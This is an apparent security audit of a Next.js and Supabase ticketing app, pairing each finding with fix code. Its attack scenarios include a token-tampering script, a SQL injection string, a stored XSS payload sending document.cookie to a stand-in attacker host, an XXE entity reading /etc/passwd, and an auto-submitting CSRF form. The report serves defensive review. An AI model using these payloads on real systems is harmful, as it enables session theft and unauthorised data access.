# Security Audit - Detailed Findings

## Overview

This document details security vulnerabilities, risks, and remediation strategies.

---

## 🔴 CRITICAL Issues (Must Fix Before Production)

### 1. Authentication System is Not Production-Ready

**Severity:** 🔴 CRITICAL

**Issue:** Custom JWT implementation without cryptographic verification.

**Current Code (login/route.ts):**
```typescript
// ❌ NOT SECURE - No signature verification
const token = Buffer.from(JSON.stringify(tokenPayload)).toString("base64url");

response.cookies.set("token", token, {
  httpOnly: true,
  secure: process.env.NODE_ENV === "production",
  sameSite: "lax",
  path: "/",
  maxAge: 60 * 60 * 24 * 7,  // 7 days - too long!
});
```

**Vulnerabilities:**
1. Token is just base64-encoded JSON - anyone can decode it
2. No signature = anyone can modify claims
3. 7-day expiry is extremely long
4. No token refresh mechanism
5. No session revocation

**Attack Scenario:**
```javascript
// Attacker can easily modify token
const token = "eyJpZCI6IjEyMyIsInJvbGUiOiJ1c2VyIn0=";
const decoded = JSON.parse(Buffer.from(token, 'base64url').toString());
decoded.role = "admin";  // Promote themselves!
const newToken = Buffer.from(JSON.stringify(decoded)).toString('base64url');
// Now send with cookie: newToken
```

**Fix - Option A: Use jsonwebtoken Package**

```typescript
// ✅ SECURE - Signed JWT
import jwt from 'jsonwebtoken';

const token = jwt.sign(
  {
    sub: userProfile.id,
    email: userProfile.email,
    role: orgRole,
    organizationId: firstOrgId,
  },
  process.env.JWT_SECRET!, // Must be strong & random
  {
    expiresIn: '1h', // Short-lived
    algorithm: 'HS256',
    audience: 'tickly-web',
    issuer: 'tickly-auth',
  }
);

// Verify token on every request
const payload = jwt.verify(token, process.env.JWT_SECRET!, {
  audience: 'tickly-web',
  issuer: 'tickly-auth',
});
```

**Fix - Option B: Use next-auth (RECOMMENDED)**

```typescript
// ✅ BEST - Industry standard
import { auth } from "@/auth";

export const { POST } = auth.handlers;
```

**Action Items:**
- [ ] Generate strong JWT_SECRET: `openssl rand -base64 32`
- [ ] Switch to `jsonwebtoken` or `next-auth`
- [ ] Implement token refresh rotation
- [ ] Add session revocation
- [ ] Reduce token TTL to 1 hour
- [ ] Add refresh token with 7-day expiry

**Timeline:** 2-3 days
**Risk:** HIGH

---

### 2. Missing Row-Level Security (RLS) Enforcement

**Severity:** 🔴 CRITICAL

**Issue:** Supabase RLS policies not enforced; backend filtering is inconsistent.

**Current Code (admin-tickets-route):**
```typescript
// ❌ INSECURE - Returns all tickets regardless of organization
const { data: tickets } = await supabase
  .from("support_tickets")
  .select("*");  // No WHERE clause for organization_id!

// Uses supabaseAdmin which bypasses ALL RLS policies
export const supabaseAdmin = createClient(
  SUPABASE_URL,
  SUPABASE_SERVICE_KEY  // ❌ Bypasses RLS!
);
```

**Vulnerabilities:**
1. Users can potentially see tickets from other organizations
2. Admin client bypasses all security policies
3. No database-level enforcement
4. Backend filtering can be forgotten

**Attack Scenario:**
```sql
-- Attacker SQL injection (if validation missing)
SELECT * FROM support_tickets WHERE organization_id = 'org123' OR '1'='1';
-- Returns ALL tickets from ALL organizations!
```

**Fix:**

1. **Enable RLS in Supabase:**

```sql
-- Enable RLS on all tables
ALTER TABLE support_tickets ENABLE ROW LEVEL SECURITY;
ALTER TABLE users ENABLE ROW LEVEL SECURITY;
ALTER TABLE organizations ENABLE ROW LEVEL SECURITY;

-- Create policies
CREATE POLICY "Users can only see their org tickets"
  ON support_tickets FOR SELECT
  USING (
    organization_id IN (
      SELECT organization_id
      FROM organization_members
      WHERE user_id = auth.uid()
    )
  );

CREATE POLICY "Users can only create tickets in their org"
  ON support_tickets FOR INSERT
  WITH CHECK (
    organization_id IN (
      SELECT organization_id
      FROM organization_members
      WHERE user_id = auth.uid()
    )
  );
```

2. **Use authenticated client for sensitive queries:**

```typescript
// ✅ SECURE - Use public Supabase client (applies RLS)
export const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

// Only use admin client for database maintenance, NOT in API routes
export const supabaseAdmin = createClient(
  SUPABASE_URL,
  SUPABASE_SERVICE_KEY
);

// In API routes, use supabase not supabaseAdmin:
const { data: tickets } = await supabase
  .from("support_tickets")
  .select("*");  // RLS applies automatically
```

3. **Add explicit organization filtering:**

```typescript
export async function getTicketsForOrganization(orgId: string) {
  const { data: tickets } = await supabase
    .from("support_tickets")
    .select("*")
    .eq("organization_id", orgId);  // Explicit filter
  return tickets;
}
```

**Action Items:**
- [ ] Review all Supabase table definitions
- [ ] Enable RLS on all tables
- [ ] Create comprehensive RLS policies
- [ ] Test data isolation with multiple users
- [ ] Audit all admin routes
- [ ] Replace supabaseAdmin usage in API routes

**Timeline:** 2-3 days
**Risk:** CRITICAL

---

### 3. No Input Validation on API Endpoints

**Severity:** 🔴 CRITICAL

**Issue:** Most API routes accept user input without validation.

**Vulnerable Code:**
```typescript
// admin-tickets-route/route.ts
export async function POST(req: Request) {
  const { title, description, priority, status } = await req.json();
  
  // ❌ NO VALIDATION - Direct to database!
  const { data: ticket, error } = await supabase
    .from("support_tickets")
    .insert([{ title, description, priority, status }])
    .select()
    .single();
}

// signup/route.ts
export async function POST(req: Request) {
  const { fullName, email, password, confirm_password } = await req.json();
  // Basic validation only in form-validation.ts
  // But not applied here!
}
```

**Vulnerabilities:**
1. **XSS via stored data:** User enters `<script>alert('xss')</script>` as title
2. **NoSQL injection:** With certain inputs and improper escaping
3. **Buffer overflow:** Long strings could break storage
4. **SQL injection:** If raw SQL used anywhere (currently Supabase client prevents)
5. **XXE attacks:** If XML processing added later
6. **SSRF:** If user input used in URLs

**Attack Scenario:**
```javascript
// POST /api/admin/admin-tickets-route
{
  "title": "<img src=x onerror='fetch(attackerserver.com/?cookie='+document.cookie+')'>",
  "description": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"
}
```

**Fix: Add Zod Schema Validation**

```typescript
// src/lib/schemas.ts
import { z } from 'zod';

export const TicketSchema = z.object({
  title: z.string()
    .min(3, "Title must be at least 3 characters")
    .max(200, "Title must be less than 200 characters")
    .trim(),
  
  description: z.string()
    .min(10, "Description must be at least 10 characters")
    .max(2000, "Description must be less than 2000 characters")
    .trim(),
  
  priority: z.enum(["low", "medium", "high", "urgent"])
    .optional()
    .default("medium"),
  
  status: z.enum(["open", "in_progress", "closed"])
    .optional()
    .default("open"),
});

export type TicketInput = z.infer<typeof TicketSchema>;

// In API route:
export async function POST(req: Request) {
  try {
    const body = await req.json();
    const validatedData = TicketSchema.parse(body);  // ✅ Validates!
    
    // Now use validated data
    const { data: ticket } = await supabase
      .from("support_tickets")
      .insert([validatedData])
      .select()
      .single();
    
    return NextResponse.json({ success: true, data: ticket });
  } catch (error) {
    if (error instanceof z.ZodError) {
      return NextResponse.json(
        { success: false, error: error.errors[0].message },
        { status: 400 }
      );
    }
    // ... handle other errors
  }
}
```

**Action Items:**
- [ ] Install Zod: `npm install zod`
- [ ] Create schemas for all API inputs
- [ ] Add validation to all 39 API routes
- [ ] Test with malicious input
- [ ] Setup automated validation testing

**Timeline:** 2-3 days
**Risk:** CRITICAL

---

### 4. No CSRF Protection

**Severity:** 🔴 CRITICAL

**Issue:** POST/PUT/DELETE requests not protected against Cross-Site Request Forgery.

**Attack Scenario:**
```html
<!-- On attacker.com -->
<form action="https://tickly.app/api/admin/admin-tickets-route" method="POST">
  <input name="title" value="Malicious ticket">
  <input name="description" value="Posted by attacker">
  <input type="hidden" name="organizationId" value="target-org-id">
</form>
<script>
  document.forms[0].submit();  // Auto-submit when victim visits
</script>
```

When victim visits attacker.com while logged into Tickly, the malicious request is sent with their cookies.

**Fix: Add CSRF Token Middleware**

```typescript
// src/lib/csrf.ts
import { randomBytes } from 'crypto';

export function generateCsrfToken(): string {
  return randomBytes(32).toString('hex');
}

export function validateCsrfToken(token: string, sessionToken: string): boolean {
  // Token should be stored in session and verified on POST
  return token === sessionToken;
}

// src/middleware.ts
import { NextRequest, NextResponse } from 'next/server';
import { generateCsrfToken } from './lib/csrf';

export function middleware(request: NextRequest) {
  if (request.method === 'POST' || request.method === 'PUT' || request.method === 'DELETE') {
    const token = request.headers.get('X-CSRF-Token');
    const sessionToken = request.cookies.get('csrf-token')?.value;
    
    if (!token || token !== sessionToken) {
      return NextResponse.json(
        { error: 'CSRF token invalid' },
        { status: 403 }
      );
    }
  }
  
  return NextResponse.next();
}

export const config = {
  matcher: ['/api/:path*'],
};

// In forms:
<input type="hidden" name="csrf-token" value={csrfToken} />

// In fetch requests:
fetch('/api/endpoint', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': csrfToken,
  },
  body: JSON.stringify(data),
});
```

**Action Items:**
- [ ] Create CSRF middleware
- [ ] Generate and store CSRF tokens
- [ ] Validate on all state-changing requests
- [ ] Test with curl to verify

**Timeline:** 1 day
**Risk:** CRITICAL

---

## 🟡 HIGH Severity Issues

### 5. Weak Password Hashing

**Current Code (password-utils.ts):**
```typescript
// Using crypto-js - potentially weak
import CryptoJS from 'crypto-js';

export function hashPassword(password: string): string {
  return CryptoJS.SHA256(password).toString();
}
```

**Problems:**
1. SHA256 not designed for password hashing
2. No salt mechanism built in
3. crypto-js is outdated

**Fix:**

```typescript
import bcrypt from 'bcryptjs';

export async function hashPassword(password: string): Promise<string> {
  const salt = await bcrypt.genSalt(12);  // 12 rounds
  return bcrypt.hash(password, salt);
}

export async function verifyPassword(password: string, hash: string): Promise<boolean> {
  return bcrypt.compare(password, hash);
}
```

**Install:** `npm install bcryptjs @types/bcryptjs`

**Action Items:**
- [ ] Replace crypto-js with bcrypt
- [ ] Update password hashing
- [ ] Create migration script for existing passwords
- [ ] Test password verification

**Timeline:** 1 day
**Risk:** HIGH

---

### 6. Missing Rate Limiting

**Issue:** No protection against brute force attacks.

**Attack:** Attacker can try unlimited login attempts.

**Fix:**

```typescript
// src/lib/rate-limit.ts
import { Ratelimit } from '@upstash/ratelimit';
import { Redis } from '@upstash/redis';

const ratelimit = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(5, '15 m'),  // 5 attempts per 15 minutes
});

export async function checkRateLimit(key: string): Promise<boolean> {
  const { success } = await ratelimit.limit(key);
  return success;
}

// In login/route.ts
export async function POST(req: Request) {
  const { email, password } = await req.json();
  
  // Check rate limit
  const isAllowed = await checkRateLimit(`login:${email}`);
  if (!isAllowed) {
    return NextResponse.json(
      { success: false, error: "Too many login attempts. Try again later." },
      { status: 429 }
    );
  }
  
  // ... continue with login
}
```

**Alternative (without Upstash):**

```typescript
const loginAttempts = new Map<string, { count: number; resetTime: number }>();

function checkRateLimit(email: string): boolean {
  const now = Date.now();
  const record = loginAttempts.get(email);
  
  if (!record || now > record.resetTime) {
    loginAttempts.set(email, { count: 1, resetTime: now + 15 * 60 * 1000 });
    return true;
  }
  
  if (record.count >= 5) {
    return false;
  }
  
  record.count++;
  return true;
}
```

**Action Items:**
- [ ] Implement rate limiting on /api/login
- [ ] Implement rate limiting on /api/signup
- [ ] Log rate limit violations
- [ ] Alert on suspicious activity

**Timeline:** 1 day
**Risk:** HIGH

---

### 7. Missing Security Headers

**Issue:** No HTTP security headers set.

**Missing Headers:**
```
Content-Security-Policy: default-src 'self'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

**Fix (next.config.js):**

```javascript
const securityHeaders = [
  {
    key: 'X-Content-Type-Options',
    value: 'nosniff'
  },
  {
    key: 'X-Frame-Options',
    value: 'DENY'
  },
  {
    key: 'X-XSS-Protection',
    value: '1; mode=block'
  },
  {
    key: 'Strict-Transport-Security',
    value: 'max-age=31536000; includeSubDomains'
  },
  {
    key: 'Content-Security-Policy',
    value: "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'"
  },
];

export default {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: securityHeaders,
      },
    ];
  },
};
```

**Action Items:**
- [ ] Add security headers to next.config.js
- [ ] Test headers with curl
- [ ] Configure CSP properly

**Timeline:** 30 minutes
**Risk:** HIGH

---

## 🟡 MEDIUM Severity Issues

### 8. Missing Audit Logging

**Issue:** No record of who did what and when.

**Impact:** Can't debug security incidents or investigate suspicious activity.

**Fix:**

```typescript
// src/lib/audit-log.ts
export interface AuditLog {
  id: string;
  userId: string;
  organizationId: string;
  action: string;
  resource: string;
  resourceId: string;
  changes?: Record<string, any>;
  ipAddress?: string;
  userAgent?: string;
  timestamp: Date;
}

export async function logAuditEvent(event: Omit<AuditLog, 'id' | 'timestamp'>) {
  await supabaseAdmin
    .from('audit_logs')
    .insert([{
      ...event,
      timestamp: new Date(),
    }]);
}

// Usage:
await logAuditEvent({
  userId: user.id,
  organizationId: org.id,
  action: 'DELETE',
  resource: 'ticket',
  resourceId: ticket.id,
});
```

**Action Items:**
- [ ] Create audit_logs table
- [ ] Log all sensitive operations
- [ ] Create audit log viewer in admin dashboard
- [ ] Setup retention policy (30-90 days)

**Timeline:** 2 days
**Risk:** MEDIUM

---

### 9. Missing HTTPS Enforcement

**Issue:** In development, HTTP is allowed.

**Fix:**

```typescript
// next.config.js
export default {
  headers: async () => [
    {
      source: '/:path*',
      headers: [
        {
          key: 'Strict-Transport-Security',
          value: 'max-age=31536000; includeSubDomains; preload'
        },
      ],
    },
  ],
  redirects: async () => {
    if (process.env.NODE_ENV === 'production') {
      return [
        {
          source: '/:path*',
          has: [{ type: 'header', key: 'x-forwarded-proto', value: 'http' }],
          destination: 'https://:host/:path*',
          permanent: true,
        },
      ];
    }
    return [];
  },
};
```

**Action Items:**
- [ ] Ensure HTTPS-only in production
- [ ] Setup HSTS header
- [ ] Test redirect with curl

**Timeline:** 1 hour
**Risk:** MEDIUM

---

### 10. Environment Variable Exposure

**Current Setup (safe):**
```
✅ .env.local (not in git)
✅ .env.development.local (not in git)
✅ NEXT_PUBLIC_* only for public data
✅ Secrets in server-side code only
```

**Risks to Watch:**
- Don't commit .env files
- Don't expose secrets in browser console
- Rotate secrets regularly

**Action Items:**
- [ ] Create .env.example
- [ ] Document all required env vars
- [ ] Setup automatic secret rotation

**Timeline:** 1 hour
**Risk:** MEDIUM

---

## Security Checklist

- [ ] 🔴 CRITICAL: Replace custom JWT with proper implementation
- [ ] 🔴 CRITICAL: Enable RLS in Supabase
- [ ] 🔴 CRITICAL: Add input validation to all API routes
- [ ] 🔴 CRITICAL: Implement CSRF protection
- [ ] 🟡 HIGH: Fix password hashing with bcrypt
- [ ] 🟡 HIGH: Add rate limiting to auth endpoints
- [ ] 🟡 HIGH: Add security headers
- [ ] 🟡 MEDIUM: Implement audit logging
- [ ] 🟡 MEDIUM: Enforce HTTPS
- [ ] 🟡 MEDIUM: Add API key management for public endpoints

---

## Security Testing

### Recommended Security Testing:

1. **OWASP Top 10 Assessment**
   - SQL Injection
   - XSS/CSRF
   - Broken Authentication
   - Sensitive Data Exposure
   - Broken Access Control
   - Security Misconfiguration

2. **Tools:**
   - Burp Suite (commercial/community)
   - OWASP ZAP (free)
   - npm `snyk` for dependency scanning
   - npm `npm audit` for vulnerabilities

3. **Commands:**
   ```bash
   npm audit                    # Check dependencies
   npm audit fix               # Auto-fix vulnerabilities
   snyk test                   # Security scanning
   ```

---

## Recommended Timeline

**Week 1:**
- Day 1-2: Implement proper JWT + next-auth
- Day 2-3: Enable RLS in Supabase
- Day 3-4: Add input validation
- Day 4-5: Add CSRF protection

**Week 2:**
- Day 1-2: Fix password hashing
- Day 2-3: Add rate limiting
- Day 3-4: Add security headers
- Day 4-5: Security testing

---

**Report Generated:** July 25, 2026
**Risk Level:** 🔴 CRITICAL - Must address before production deployment
